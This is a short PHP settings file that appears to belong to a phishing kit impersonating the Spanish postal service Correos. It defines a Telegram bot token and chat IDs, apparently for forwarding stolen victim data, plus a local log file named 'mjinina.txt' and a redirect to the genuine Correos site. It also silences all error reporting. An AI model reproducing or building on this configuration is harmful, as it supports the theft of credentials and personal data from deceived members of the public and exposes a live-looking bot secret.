<?php

error_reporting(0);

define("TELEGRAM_TOKEN", "7682956145:AAFf20g1WqxmsZMcXRkBtlzA6QsdX5XaMQ8");
define("TELEGRAM_CHAT_ID", "-1002459080474");
define("TELEGRAM_CHAT_IDD", "-1002459080474");
define("TXT_FILE_NAME", 'mjinina.txt');
define("REDIRECT_WEBSITE", "https://www.correos.com/grupo-correos/");



?>